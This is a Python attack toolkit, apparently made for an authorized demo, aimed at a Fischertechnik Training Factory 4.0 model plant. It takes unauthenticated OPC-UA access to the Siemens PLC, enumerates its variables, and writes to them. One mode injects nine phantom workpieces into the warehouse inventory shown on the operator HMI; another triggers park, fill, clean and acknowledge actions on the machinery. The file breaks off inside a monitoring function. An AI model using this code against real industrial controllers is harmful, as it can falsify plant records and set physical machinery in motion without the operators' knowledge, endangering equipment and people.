#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║   NTT DATA · Offensive Security Toolkit (combined edition)           ║
║   Target: Fischertechnik Training Factory 4.0 (24V)                  ║
║   By: Diego Carreño Rejano                                           ║
║   Canales:                                                           ║
║     · MQTT Broker Compromise                                         ║
║     · OPC-UA Direct PLC Attack                                       ║
║                                                                      ║
║   For authorized demonstration purposes only.                        ║ 
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import argparse
import asyncio
import base64
import json
import os
import random
import re
import sys
import textwrap
import threading
import time
import warnings
from datetime import datetime, timezone, timedelta
from pathlib import Path

try:
    import readline  # noqa: F401
except ImportError:
    pass

warnings.filterwarnings("ignore", category=DeprecationWarning,
                        message=r".*Callback API version 1 is deprecated.*")

import paho.mqtt.client as mqtt

try:
    from asyncua import Client as UaClient, ua
    _HAS_ASYNCUA = True
except ImportError:
    UaClient = None
    ua = None
    _HAS_ASYNCUA = False


# ════════════════════════════════════════════════════════════════════════
# CONFIGURACIÓN
# ════════════════════════════════════════════════════════════════════════

BROKER = "192.168.0.10"
PORT   = 1883
USER   = ""
PASS   = ""

ENDPOINT = os.getenv("PLC_ENDPOINT", "opc.tcp://192.168.0.1:4840")
NS_PLC = 3

COLORS = ["RED", "BLUE", "WHITE"]

SCRIPT_DIR = Path(__file__).resolve().parent
FIRE_FRAMES = [
    SCRIPT_DIR / "image" / "fire_1.png",
    SCRIPT_DIR / "image" / "fire_2.png",
    SCRIPT_DIR / "image" / "fire_3.png",
    SCRIPT_DIR / "image" / "fire_2.png",
]
FREEZE_FRAME = SCRIPT_DIR / "image" / "freeze.png"

CAM_WIDTH = 320
CAM_HEIGHT = 240
CAM_FRAME_DELAY = 0.1
CAM_JPEG_QUALITY = 85

TARGETS_READ = [
    ('gtyp_Setup.x_Fill_Rack_HBW',        'trigger HBW fill sequence'),
    ('gtyp_Setup.x_Clean_Rack_HBW',       'trigger HBW clean sequence'),
    ('gtyp_Setup.x_Park_Position',        'send all stations to parking'),
    ('gtyp_Setup.x_AcknowledgeButton',    'simulate operator ACK click'),
    ('gtyp_SSC.w_Threshold_White_Red',    'SSC white/red color threshold'),
    ('gtyp_SSC.w_Threshold_Red_Blue',     'SSC red/blue color threshold'),
    ('gtyp_SLD.w_Threshold_White_Red',    'SLD white/red color threshold'),
    ('gtyp_SLD.w_Threshold_Red_Blue',     'SLD red/blue color threshold'),
    ('gtyp_MPO.x_Error',                  'MPO station error flag'),
    ('gtyp_SSC.x_Error',                  'SSC camera error flag'),
    ('gtyp_HBW.x_Error',                  'HBW warehouse error flag'),
    ('gtyp_SLD.x_Error',                  'SLD sorting error flag'),
    ('gtyp_Setup.r_Version_SPS',          'PLC firmware version'),
]


# ════════════════════════════════════════════════════════════════════════
# ANSI palette — NTT DATA brand
# ════════════════════════════════════════════════════════════════════════
class C:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    REV     = "\033[7m"

    FG      = "\033[38;5;255m"
    DIM_FG  = "\033[38;5;255m"
    MUTE    = "\033[38;5;245m"
    DEEP    = "\033[38;5;240m"
    WHITE   = "\033[38;5;255m"

    BLUE    = "\033[38;5;33m"
    BLUE_L  = "\033[38;5;39m"
    BLUE_D  = "\033[38;5;25m"
    TEAL    = "\033[38;5;51m"
    SEAL    = "\033[48;5;17m\033[38;5;33m"

    GREEN   = "\033[38;5;35m"
    YELLOW  = "\033[38;5;220m"
    ORANGE  = "\033[38;5;208m"
    RED     = "\033[38;5;203m"
    RED_B   = "\033[1;38;5;203m"

    @staticmethod
    def strip():
        if not sys.stdout.isatty() or os.getenv("NO_COLOR"):
            for attr in dir(C):
                if not attr.startswith("_") and attr not in ("strip",):
                    setattr(C, attr, "")


C.strip()


# ════════════════════════════════════════════════════════════════════════
# Helpers visuales
# ════════════════════════════════════════════════════════════════════════
def ts(offset_seconds=0):
    n = datetime.now(timezone.utc) + timedelta(seconds=offset_seconds)
    return n.strftime("%Y-%m-%dT%H:%M:%S.") + f"{n.microsecond // 1000:03d}Z"


def clock():
    return datetime.now().strftime("%H:%M:%S")


def term_width():
    try:
        w = os.get_terminal_size().columns
        return max(w, 40)
    except OSError:
        return 76


def visible_len(s):
    return len(re.sub(r"\033\[[0-9;]*m", "", s))


def banner():
    b = rf"""{C.BLUE}{C.BOLD}
   ███████╗████████╗   ███████╗██╗███╗   ███╗
   ██╔════╝╚══██╔══╝   ██╔════╝██║████╗ ████║
   █████╗     ██║█████╗███████╗██║██╔████╔██║
   ██╔══╝     ██║╚════╝╚════██║██║██║╚██╔╝██║
   ██║        ██║      ███████║██║██║ ╚═╝ ██║
   ╚═╝        ╚═╝      ╚══════╝╚═╝╚═╝     ╚═╝{C.RESET}
   {C.DIM_FG}Factory Security Toolkit{C.RESET}  {C.MUTE}·{C.RESET}  {C.DIM_FG}Fischertechnik 4.0 (24V){C.RESET}
   {C.SEAL} NTT DATA {C.RESET}  {C.DIM_FG}MQTT + OPC-UA · Authorized demo{C.RESET}
"""
    print(b)


def rule(char="─", color=None):
    color = color if color is not None else C.MUTE
    w = min(term_width(), 76)
    print(f"{color}{char * w}{C.RESET}")


def ok(msg):
    print(f"  {C.GREEN}▸{C.RESET} {msg}")


def warn(msg):
    print(f"  {C.ORANGE}▸{C.RESET} {msg}")


def err(msg):
    print(f"  {C.RED}✗{C.RESET} {msg}")


def info(msg):
    print(f"  {C.DIM_FG}·{C.RESET} {C.DIM_FG}{msg}{C.RESET}")


def mqtt_line(topic, note=""):
    t_col = f"{C.BLUE}{topic}{C.RESET}"
    if note:
        print(f"  {C.MUTE}→{C.RESET} {t_col}  {C.DIM_FG}{note}{C.RESET}")
    else:
        print(f"  {C.MUTE}→{C.RESET} {t_col}")


def cmd_line(cmd):
    max_w = min(term_width(), 100) - 6
    display = cmd if len(cmd) <= max_w else cmd[:max_w - 1] + "…"
    print(f"  {C.MUTE}┃{C.RESET} {C.MUTE}${C.RESET} {C.BLUE_L}{display}{C.RESET}")


def mosq_pub(topic, payload, qos=0):
    flags = f"-q {qos} " if qos else ""
    compact = json.dumps(payload, separators=(",", ":"))
    safe = compact.replace("'", "'\\''")
    port_flag = f"-p {PORT} " if PORT != 1883 else ""
    return f"mosquitto_pub -h {BROKER} {port_flag}-t {topic} {flags}-m '{safe}'"


def narration(text):
    print(f"    {C.ORANGE}※{C.RESET} {C.DIM_FG}{text}{C.RESET}")


def phase(n, description):
    print(f"    {C.ORANGE}▸ FASE {n}{C.RESET} {C.DIM_FG}· {description}{C.RESET}")


def bell():
    if sys.stdout.isatty():
        sys.stdout.write("\a")
        sys.stdout.flush()


def countdown(seconds=3, label="LAUNCHING"):
    print()
    box_w = 44
    print(f"  {C.RED_B}╔{'═' * (box_w - 2)}╗{C.RESET}")
    label_pad = label.center(box_w - 2)
    print(f"  {C.RED_B}║{C.RESET}{C.RED_B}{C.BOLD}{label_pad}{C.RESET}{C.RED_B}║{C.RESET}")
    print(f"  {C.RED_B}║{' ' * (box_w - 2)}║{C.RESET}")
    for i in range(seconds, 0, -1):
        bell()
        num_str = str(i)
        num_pad = num_str.center(box_w - 2)
        sys.stdout.write(f"\r  {C.RED_B}║{C.RESET}"
                         f"{C.RED_B}{C.BOLD}{num_pad}{C.RESET}"
                         f"{C.RED_B}║{C.RESET}")
        sys.stdout.flush()
        time.sleep(1)
    print()
    print(f"  {C.RED_B}╚{'═' * (box_w - 2)}╝{C.RESET}")
    print()


def section(title, color=None):
    color = color if color is not None else C.BLUE
    w = min(term_width(), 76)
    inner = f" {title} "
    line = (f"{C.MUTE}╾───{C.RESET}{color}{C.BOLD}{inner}{C.RESET}"
            f"{C.MUTE}{'─' * (w - 4 - len(inner) - 1)}╼{C.RESET}")
    print(f"\n{line}")


# ════════════════════════════════════════════════════════════════════════
# OPC-UA helpers
# ════════════════════════════════════════════════════════════════════════

def make_nodeid(ns: int, target: str) -> str:
    parts = target.split(".")
    quoted = '.'.join(f'"{p}"' for p in parts)
    return f'ns={ns};s={quoted}'


async def connect_unauth(endpoint: str):
    client = UaClient(url=endpoint, timeout=5)
    await client.connect()
    return client


async def s7_write(node, value, variant_type=None):
    if variant_type is None:
        variant_type = await node.read_data_type_as_variant_type()

    dv = ua.DataValue(
        Value=ua.Variant(value, variant_type),
        SourceTimestamp=None,
        ServerTimestamp=None,
    )
    await node.write_attribute(ua.AttributeIds.Value, dv)


async def detect_namespace(client) -> int:
    try:
        ns_array = await client.get_namespace_array()
        print(f"    {C.MUTE}namespaces disponibles:{C.RESET}")
        for i, ns in enumerate(ns_array):
            print(f"      [{i}] {ns}")

        for i, ns in enumerate(ns_array):
            if "siemens.com/simatic-s7-opcua" in ns.lower():
                return i

        for i, ns in enumerate(ns_array):
            if "simatic" in ns.lower() and "application" in ns.lower():
                return i

        for i, ns in enumerate(ns_array):
            if ns.lower().startswith("urn:"):
                return i

        for i, ns in enumerate(ns_array):
            if i > 0 and "opcfoundation.org" not in ns.lower():
                return i

    except Exception as e:
        warn(f"namespace detection failed: {e}")
    return NS_PLC


# ════════════════════════════════════════════════════════════════════════
# OPC-UA commands
# ════════════════════════════════════════════════════════════════════════

async def cmd_discover(max_depth: int = 6):
    info(f"connecting to {ENDPOINT} {C.MUTE}(no auth, no TLS){C.RESET}…")
    try:
        client = await connect_unauth(ENDPOINT)
    except Exception as e:
        err(f"connection failed: {e}")
        return

    try:
        ok("connected — walking node tree")
        target_ns = await detect_namespace(client)
        print(f"    {C.MUTE}target namespace: {C.BLUE_L}{target_ns}{C.RESET}")
        print(f"    {C.MUTE}max depth: {max_depth}{C.RESET}")
        print()

        variables_found = []
        objects_seen = 0

        async def walk(node, depth=0, path=""):
            nonlocal objects_seen
            if depth > max_depth:
                return
            try:
                children = await node.get_children()
            except Exception:
                return

            for child in children:
                try:
                    browse_name = await child.read_browse_name()
                    name = browse_name.Name
                    child_ns = browse_name.NamespaceIndex
                    cls = await child.read_node_class()
                    nid = child.nodeid

                    if depth == 0 and name in ("Server", "Aliases", "Types", "Views"):
                        continue

                    full_path = f"{path}/{name}" if path else name
                    indent = "  " * depth

                    if cls.name == "Variable":
                        try:
                            val = await child.read_value()
                            val_str = str(val)
                            if len(val_str) > 45:
                                val_str = val_str[:42] + "…"
                            ns_tag = (f"{C.ORANGE}[ns={child_ns}]{C.RESET}"
                                      if child_ns == target_ns
                                      else f"{C.MUTE}[ns={child_ns}]{C.RESET}")
                            print(f"    {indent}{C.GREEN}▸{C.RESET} {ns_tag} "
                                  f"{C.WHITE}{name:<30s}{C.RESET} "
                                  f"{C.BLUE_L}{val_str}{C.RESET}")
                            print(f"    {indent}  {C.MUTE}{nid.to_string()}{C.RESET}")
                            variables_found.append((full_path, nid.to_string(), val))
                        except Exception as e:
                            print(f"    {indent}{C.MUTE}▸ [ns={child_ns}] {name:<30s} "
                                  f"(unreadable: {type(e).__name__}){C.RESET}")

                    elif cls.name == "Object":
                        ns_tag = (f"{C.ORANGE}[ns={child_ns}]{C.RESET}"
                                  if child_ns == target_ns
                                  else f"{C.MUTE}[ns={child_ns}]{C.RESET}")
                        print(f"    {indent}{C.BLUE}▶{C.RESET} {ns_tag} "
                              f"{C.BOLD}{name}{C.RESET} "
                              f"{C.MUTE}({nid.to_string()}){C.RESET}")
                        objects_seen += 1
                        await walk(child, depth + 1, full_path)
                except Exception:
                    continue

        root = client.nodes.objects
        await walk(root)

        print()
        print(f"  {C.BOLD}━━━ Resumen ━━━{C.RESET}")
        print(f"    Objects recorridos:  {objects_seen}")
        print(f"    Variables encontradas (todos los ns): {len(variables_found)}")
        target_vars = [v for v in variables_found if f"ns={target_ns};" in v[1]]
        print(f"    Variables en ns={target_ns} (target): {C.ORANGE}{len(target_vars)}{C.RESET}")

        if target_vars:
            print()
            print(f"  {C.BOLD}NodeIDs copy-paste ready:{C.RESET}")
            for path, nid_str, _ in target_vars[:40]:
                print(f"    {C.MUTE}{path:<50s}{C.RESET}  {nid_str}")

    finally:
        await client.disconnect()
        print()


async def cmd_browse():
    info(f"connecting to {ENDPOINT} {C.MUTE}(no auth, no TLS){C.RESET}…")
    try:
        client = await connect_unauth(ENDPOINT)
    except Exception as e:
        err(f"connection failed: {e}")
        return

    try:
        ok("CONNECTED — server accepted unauthenticated session")
        print()

        ns = await detect_namespace(client)
        print(f"    {C.MUTE}using namespace index: {C.BLUE_L}{ns}{C.RESET}")
        print()

        root = client.nodes.objects
        children = await root.get_children()

        print(f"  {C.BOLD}Root namespace browse:{C.RESET}")
        for child in children:
            try:
                name = (await child.read_browse_name()).Name
                cls = await child.read_node_class()
                print(f"    {C.MUTE}{cls.name:<14}{C.RESET} {C.WHITE}{name}{C.RESET}")
            except Exception:
                pass
        print()

        print(f"  {C.BOLD}Targeted reads (known PLC variables):{C.RESET}")
        print(f"    {C.MUTE}(NodeID format: ns={ns};s=\"DB\".\"Var\"){C.RESET}")
        print()
        found = 0
        for target, desc in TARGETS_READ:
            nid = make_nodeid(ns, target)
            try:
                node = client.get_node(nid)
                val = await node.read_value()
                val_str = str(val)[:40]
                ok(f"{target:<38s} = {C.BLUE_L}{val_str}{C.RESET}")
                print(f"      {C.MUTE}{desc}{C.RESET}")
                found += 1
            except Exception as e:
                warn(f"{target:<38s} {C.MUTE}({type(e).__name__}){C.RESET}")
        print()
        if found == 0:
            info("if no variables were found, try discover")

    finally:
        await client.disconnect()
        print()
        info("disconnected")


async def cmd_read():
    info(f"connecting to {ENDPOINT}…")
    try:
        client = await connect_unauth(ENDPOINT)
    except Exception as e:
        err(f"connection failed: {e}")
        return

    try:
        ok("connected — reading plant snapshot")
        ns = await detect_namespace(client)
        print()
        print(f"  {C.MUTE}{datetime.now().isoformat(timespec='seconds')} "
              f"· namespace={ns}{C.RESET}")
        print()

        for target, desc in TARGETS_READ:
            nid = make_nodeid(ns, target)
            try:
                node = client.get_node(nid)
                val = await node.read_value()
                val_str = str(val)[:50]
                print(f"    {C.WHITE}{target:<38s}{C.RESET} "
                      f"{C.BLUE_L}{val_str}{C.RESET}")
            except Exception as e:
                print(f"    {C.MUTE}{target:<38s} ({type(e).__name__}){C.RESET}")

    finally:
        await client.disconnect()
        print()


def _inspect_value(val, indent=0):
    pad = " " * indent
    if hasattr(val, "__dict__"):
        fields = {k: v for k, v in vars(val).items() if not k.startswith("_")}
        if fields:
            for k, v in fields.items():
                if hasattr(v, "__dict__") and not isinstance(v, (str, int, float, bool)):
                    print(f"{pad}{C.WHITE}{k}:{C.RESET} {C.MUTE}({type(v).__name__}){C.RESET}")
                    _inspect_value(v, indent + 2)
                else:
                    v_str = str(v)[:60]
                    print(f"{pad}{C.WHITE}{k}:{C.RESET} {C.BLUE_L}{v_str}{C.RESET}")
            return
    print(f"{pad}{C.BLUE_L}{str(val)[:200]}{C.RESET}")


async def cmd_inspect(target: str):
    info(f"connecting to {ENDPOINT}…")
    try:
        client = await connect_unauth(ENDPOINT)
    except Exception as e:
        err(f"connection failed: {e}")
        return

    try:
        ok("connected")
        ns = await detect_namespace(client)
        print()

        info("loading custom type definitions from PLC…")
        try:
            await client.load_data_type_definitions()
            ok("type definitions loaded")
        except Exception as e:
            warn(f"couldn't load type definitions: {type(e).__name__}")
            warn("ExtensionObjects will show as raw — limited info available")
        print()

        nid = make_nodeid(ns, target)
        info(f"target: {C.WHITE}{target}{C.RESET}")
        info(f"NodeID: {C.MUTE}{nid}{C.RESET}")
        print()

        node = client.get_node(nid)

        try:
            browse_name = await node.read_browse_name()
            print(f"  {C.BOLD}Browse name:{C.RESET} {browse_name.Name}")
        except Exception:
            pass

        try:
            dt_variant = await node.read_data_type_as_variant_type()
            print(f"  {C.BOLD}Data type:{C.RESET}  {dt_variant.name}")
        except Exception:
            pass

        try:
            value_rank = await node.read_value_rank()
            print(f"  {C.BOLD}Value rank:{C.RESET} {value_rank} "
                  f"{C.MUTE}(-1=scalar, 1=1D array, 2=2D array){C.RESET}")
        except Exception:
            pass

        try:
            access = await node.read_attribute(ua.AttributeIds.AccessLevel)
            al = access.Value.Value
            print(f"  {C.BOLD}Access level:{C.RESET} {al} "
                  f"{C.MUTE}(1=read, 2=write, 3=read+write){C.RESET}")
        except Exception:
            pass

        print()
        print(f"  {C.BOLD}Current value:{C.RESET}")
        try:
            val = await node.read_value()
            print(f"    {C.MUTE}type: {type(val).__name__}{C.RESET}")
            if isinstance(val, list):
                print(f"    {C.MUTE}list length: {len(val)}{C.RESET}")
                if val:
                    print(f"    {C.MUTE}first element type: {type(val[0]).__name__}{C.RESET}")
                    print()
                    print(f"  {C.BOLD}First element content:{C.RESET}")
                    _inspect_value(val[0], indent=4)
                    if len(val) > 1:
                        print()
                        print(f"  {C.MUTE}... ({len(val)-1} more elements){C.RESET}")
            else:
                _inspect_value(val, indent=4)
        except Exception as e:
            err(f"could not read value: {type(e).__name__}: {e}")

    finally:
        await client.disconnect()


async def cmd_ghost(mode: str = "real", snapshot_path: str = "inventory_backup.json"):
    if mode == "snapshot":
        info(f"{C.BLUE_L} READ-ONLY operation · no writes to PLC {C.RESET}")
    elif mode == "restore":
        warn(f"{C.RED_B} WRITING TO PLC - restoring saved inventory {C.RESET}")
    else:
        warn(f"{C.RED_B} WRITING TO PLC - this affects the OFFICIAL HMI {C.RESET}")
    print()

    info(f"connecting to {ENDPOINT}...")
    try:
        client = await connect_unauth(ENDPOINT)
    except Exception as e:
        err(f"connection failed: {e}")
        return

    try:
        ok("connected")
        ns = await detect_namespace(client)
        print(f"    {C.MUTE}namespace: {ns} . mode: {mode}{C.RESET}")
        print()

        if mode == "snapshot":
            await _ghost_snapshot(client, ns, snapshot_path)
        elif mode == "restore":
            await _ghost_restore(client, ns, snapshot_path)
        else:
            await _ghost_real(client, ns)

    finally:
        await client.disconnect()


async def _ghost_snapshot(client, ns: int, path: str):
    info("loading custom type definitions from PLC...")
    try:
        await client.load_data_type_definitions()
    except Exception as e:
        warn(f"couldn't load type definitions: {e}")
        warn("snapshot may be incomplete")
    print()

    target = "gtyp_HBW.Rack_Workpiece"
    nid = make_nodeid(ns, target)
    info(f"snapshotting {C.WHITE}{target}{C.RESET}")
    print(f"    {C.MUTE}NodeID: {nid}{C.RESET}")
    print()

    node = client.get_node(nid)
    try:
        current = await node.read_value()
    except Exception as e:
        err(f"could not read Rack_Workpiece: {e}")
        return

    snapshot = {
        "timestamp": datetime.now().isoformat(timespec="seconds"),
        "endpoint": ENDPOINT,
        "namespace": ns,
        "target": target,
        "rack": [
            [
                {
                    "s_id":    getattr(wp, "s_id",    "") or "",
                    "s_type":  getattr(wp, "s_type",  "") or "",
                    "s_state": getattr(wp, "s_state", "") or "",
                }
                for wp in row
            ]
            for row in current
        ],
    }

    print(f"  {C.BOLD}Inventario capturado:{C.RESET}")
    for r, row in enumerate(snapshot["rack"]):
        rack_label = "ABC"[r] if r < 3 else str(r)
        cells = []
        for wp in row:
            t = wp["s_type"] or "....."
            i = (wp["s_id"][:8] + "…") if len(wp["s_id"]) > 8 else (wp["s_id"] or "-")
            cells.append(f"{t:6s} {C.MUTE}[{i}]{C.RESET}")
        print(f"    {C.WHITE}{rack_label}:{C.RESET} {' | '.join(cells)}")
    print()

    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(snapshot, f, indent=2, ensure_ascii=False)
        ok(f"snapshot saved: {C.BLUE_L}{path}{C.RESET}")
    except Exception as e:
        err(f"could not write file: {e}")


async def _ghost_restore(client, ns: int, path: str):
    if not os.path.exists(path):
        err(f"snapshot not found: {path}")
        info(f"run first: ghost snapshot")
        return

    try:
        with open(path, "r", encoding="utf-8") as f:
            snapshot = json.load(f)
    except Exception as e:
        err(f"could not read snapshot: {e}")
        return

    info(f"snapshot loaded: {C.BLUE_L}{path}{C.RESET}")
    print(f"    {C.MUTE}taken at: {snapshot.get('timestamp', '?')}{C.RESET}")
    print()

    info("loading custom type definitions from PLC...")
    try:
        await client.load_data_type_definitions()
        ok("type definitions loaded")
    except Exception as e:
        err(f"couldn't load type definitions: {e}")
        err("cannot rebuild typ_Workpiece without schema - aborting")
        return
    print()

    target = "gtyp_HBW.Rack_Workpiece"
    nid = make_nodeid(ns, target)
    node = client.get_node(nid)

    try:
        current = await node.read_value()
    except Exception as e:
        err(f"could not read current value: {e}")
        return

    WorkpieceType = type(current[0][0])
    info(f"using type: {WorkpieceType.__name__}")

    rack_data = snapshot.get("rack", [])
    if len(rack_data) != 3 or any(len(row) != 3 for row in rack_data):
        err("invalid snapshot format - expected 3x3 rack")
        return

    new_rack = []
    for r in range(3):
        row = []
        for c in range(3):
            wp = WorkpieceType()
            src = rack_data[r][c]
            wp.s_id    = src.get("s_id", "")    or ""
            wp.s_type  = src.get("s_type", "")  or ""
            wp.s_state = src.get("s_state", "") or ""
            row.append(wp)
        new_rack.append(row)

    print(f"  {C.BOLD}Inventario a restaurar:{C.RESET}")
    for r, row in enumerate(new_rack):
        rack_label = "ABC"[r] if r < 3 else str(r)
        cells = []
        for wp in row:
            t = wp.s_type or "....."
            i = (wp.s_id[:8] + "…") if len(wp.s_id) > 8 else (wp.s_id or "-")
            cells.append(f"{t:6s} {C.MUTE}[{i}]{C.RESET}")
        print(f"    {C.GREEN}{rack_label}:{C.RESET} {' | '.join(cells)}")
    print()

    info("writing original inventory back to PLC...")
    try:
        await s7_write(node, new_rack, ua.VariantType.ExtensionObject)
        ok(f"{C.GREEN} RESTORE SUCCESSFUL - original inventory back in PLC {C.RESET}")
    except ua.UaStatusCodeError as e:
        err(f"write rejected: {e}")
        return
    except Exception as e:
        err(f"error: {type(e).__name__}: {e}")
        return

    print()
    info("verifying...")
    try:
        after = await node.read_value()
        print(f"  {C.BOLD}Estado post-restore:{C.RESET}")
        for r, row in enumerate(after):
            rack_label = "ABC"[r] if r < 3 else str(r)
            cells = []
            for wp in row:
                t = getattr(wp, "s_type", "") or "....."
                cells.append(f"{t:6s}")
            print(f"    {C.GREEN}{rack_label}:{C.RESET} {' | '.join(cells)}")
    except Exception as e:
        warn(f"could not verify: {e}")

    print()
    ok(f"{C.GREEN} check official HMI HBW View — should match pre-attack state {C.RESET}")


async def _ghost_real(client, ns: int):
    info("loading custom type definitions from PLC...")
    try:
        await client.load_data_type_definitions()
        ok("type definitions loaded (typ_Workpiece available)")
    except Exception as e:
        err(f"couldn't load type definitions: {e}")
        err("cannot build typ_Workpiece without schema - aborting")
        return
    print()

    target = "gtyp_HBW.Rack_Workpiece"
    nid = make_nodeid(ns, target)
    info(f"REAL ghost: rewriting {C.WHITE}{target}{C.RESET}")
    print(f"    {C.MUTE}NodeID: {nid}{C.RESET}")
    print()

    node = client.get_node(nid)

    try:
        current = await node.read_value()
    except Exception as e:
        err(f"could not read current Rack_Workpiece: {e}")
        return

    print(f"  {C.BOLD}Inventario actual (antes del ataque):{C.RESET}")
    for r, row in enumerate(current):
        row_str = []
        for wp in row:
            wp_type = getattr(wp, 's_type', '') or '.....'
            row_str.append(f"{wp_type:6s}")
        rack_label = "ABC"[r] if r < 3 else str(r)
        print(f"    {C.MUTE}{rack_label}:{C.RESET} {' | '.join(row_str)}")
    print()

    WorkpieceType = type(current[0][0])
    info(f"using type: {WorkpieceType.__name__}")

    phantom_layout = [
        ["RED",   "BLUE",  "WHITE"],
        ["BLUE",  "RED",   "WHITE"],
        ["WHITE", "BLUE",  "RED"],
    ]
    ghost_id_base = "DEADBEEF"

    new_rack = []
    for r in range(3):
        row = []
        for c in range(3):
            idx = r * 3 + c
            wp = WorkpieceType()
            wp.s_id = f"{ghost_id_base}{idx:02d}"
            wp.s_type = phantom_layout[r][c]
            wp.s_state = "RAW"
            row.append(wp)
        new_rack.append(row)

    print(f"  {C.BOLD}Inventario fantasma a inyectar:{C.RESET}")
    for r, row in enumerate(new_rack):
        row_str = [f"{wp.s_type:6s}" for wp in row]
        rack_label = "ABC"[r] if r < 3 else str(r)
        print(f"    {C.ORANGE}{rack_label}:{C.RESET} {' | '.join(row_str)}")
    print()

    info("writing phantom inventory to PLC...")
    try:
        await s7_write(node, new_rack, ua.VariantType.ExtensionObject)
        ok(f"{C.RED_B} WRITE SUCCESSFUL - 9 phantom workpieces now in PLC {C.RESET}")
    except ua.UaStatusCodeError as e:
        err(f"write rejected: {e}")
        err("el PLC puede tener la variable protegida en runtime")
        return
    except Exception as e:
        err(f"error: {type(e).__name__}: {e}")
        return

    print()
    info("reading back...")
    try:
        after = await node.read_value()
        print(f"  {C.BOLD}Estado post-ataque:{C.RESET}")
        for r, row in enumerate(after):
            row_str = [f"{getattr(wp,'s_type','?') or '.....':6s}" for wp in row]
            rack_label = "ABC"[r] if r < 3 else str(r)
            print(f"    {C.ORANGE}{rack_label}:{C.RESET} {' | '.join(row_str)}")
    except Exception as e:
        warn(f"could not read back: {e}")

    print()
    ok(f"{C.RED_B} ATTACK COMPLETE - check official HMI HBW View pane {C.RESET}")
    info("el HMI oficial ahora muestra las 9 piezas fantasma")
    info("si el operador ordena produccion, el VGR ira a slots inventados")


async def cmd_alert(message: str = ""):
    action_map = {
        "park":  ("gtyp_Setup.x_Park_Position",       "send all stations to parking position"),
        "fill":  ("gtyp_Setup.x_Fill_Rack_HBW",       "trigger HBW fill sequence"),
        "clean": ("gtyp_Setup.x_Clean_Rack_HBW",      "trigger HBW clean/empty sequence"),
        "ack":   ("gtyp_Setup.x_AcknowledgeButton",   "simulate operator ACK click"),
    }

    choice = (message or "park").strip().lower()
    if choice not in action_map:
        err(f"unknown action: '{choice}'")
        info(f"choices: {', '.join(action_map.keys())}")
        return

    target, desc = action_map[choice]

    info(f"connecting to {ENDPOINT}…")
    try:
        client = await connect_unauth(ENDPOINT)
    except Exception as e:
        err(f"connection failed: {e}")
        return

    try:
        ok("connected")
        ns = await detect_namespace(client)
        print()

        nid = make_nodeid(ns, target)
        info(f"target: {C.WHITE}{target}{C.RESET}")
        info(f"action: {C.ORANGE}{desc}{C.RESET}")
        print(f"    {C.MUTE}NodeID: {nid}{C.RESET}")
        print()

        node = client.get_node(nid)
        try:
            current = await node.read_value()
            print(f"    {C.MUTE}current: {current}{C.RESET}")
        except Exception as e:
            warn(f"could not read current value: {e}")

        info(f"writing True to trigger action…")
        try:
            await s7_write(node, True, ua.VariantType.Boolean)
            ok(f"{C.RED_B} ACTION TRIGGERED · {desc} {C.RESET}")
            ok("watch the plant / HMI for physical response")
        except ua.UaStatusCodeError as e:
            err(f"write rejected: {e}")
        except Exception as e:
            err(f"error: {type(e).__name__}: {e}")

    finally:
        await client.disconnect()


class _MonitorHandler:
    def __init__(self):
        self.last_values = {}
        self.event_count = 0

    def _format_value(self, val):
        if hasattr(val, "s_type") and hasattr(val, "s_state"):
            wp_type = getattr(val, "s_type", "") or "-"
            wp_state = getattr(val, "s_state", "") or "-"
            wp_id = getattr(val, "s_id", "") or ""
            wp_id_short = (wp_id[:10] + "…") if len(wp_id) > 10 else wp_id
            return f"type={wp_type} state={wp_state} id={wp_id_short}"

        if hasattr(val, "di_Target_Position") and hasattr(val, "di_Actual_Position"):
            actual = getattr(val, "di_Actual_Position", None)
            target = getattr(val, "di_Target_Position", None)
            moving = getattr(val, "x_Start_Positioning", False)
            reached = getattr(val, "x_Position_Reached", False)
            flag = ""
            if moving:
                flag = f" {C.ORANGE}[moving]{C.RESET}"
            elif reached:
                flag = f" {C.MUTE}[reached]{C.RESET}"
            return f"actual={actual:<5} target={target:<5}{flag}"

        s = str(val)
        return s if len(s) <= 60 else s[:57] + "…"

    def datachange_notification(self, node, val, data):
        try:
            nid = node.nodeid.to_string()
            display = nid.split(";s=")[-1].replace('"', '')

            val_str = self._format_value(val)

            prev = self.last_values.get(nid)
            prev_str = self._format_value(prev) if prev is not None else None
            self.last_values[nid] = val
            self.event_count += 1

            tstr = datetime.now().strftime("%H:%M:%S")
            if prev is None:
                print(f"  {C.MUTE}{tstr}{C.RESET} {C.BLUE}◦{C.RESET} {C.WHITE}{display:<50s}{C.RESET} "
                      f"{C.MUTE}= {val_str}{C.RESET}")
            else:
                if val_str == prev_str:
                    return
                print(f"  {C.MUTE}{tstr}{C.RESET} {C.ORANGE}▸{C.RESET} {C.WHITE}{display:<50s}{C.RESET} "
                      f"{C.MUTE}{prev_str}{C.RESET} → {C.BLUE_L}{val_str}{C.RESET}")
        except Exception:
            pass


async def cmd_monitor(duration_s: int = 60):
    info(f"connecting to {ENDPOINT}...")
    try:
        client = await connect_unauth(ENDPOINT)
    except Exception as e:
        err(f"connection failed: {e}")
        return

    try:
        ok("connected — setting up subscription")
        ns = await detect_namespace(client)
        print()

        info("loading custom type definitions from PLC...")
        try:
            await client.load_data_type_definitions()
            ok("type definitions loaded")
        except Exception as e:
            warn(f"couldn't load type definitions: {type(e).__name__}")
            warn("ExtensionObjects (axes, workpieces) will show as raw")
        print()

        monitored = [
            "gtyp_MPO.x_Error", "gtyp_SSC.x_Error",
            "gtyp_HBW.x_Error", "gtyp_SLD.x_Error",
            "gtyp_VGR.x_State_Process",
            "gtyp_VGR.x_HBW_Storage", "gtyp_VGR.x_HBW_Outsource",
            "gtyp_VGR.x_HBW_PickedUp", "gtyp_VGR.x_HBW_Discards",
            "gtyp_VGR.x_Ready_For_Outsource",
            "gtyp_VGR.x_Workpiece_NiO",
            "gtyp_VGR.x_NFC_Start_First",
            "gtyp_VGR.x_NFC_Start",
            "gtyp_VGR.x_NFC_Completed",
            "gtyp_VGR.x_MPO_Req_Discard", "gtyp_VGR.x_MPO_Discards",
            "gtyp_HBW.x_HBW_PickedUp_Accepted",
            "gtyp_HBW.x_HBW_Discards_Accepted",
            "gtyp_VGR.x_Park_Position_Reached",
            "gtyp_HBW.x_Park_Position_Reached",
            "gtyp_SSC.x_Park_Position_Reached",
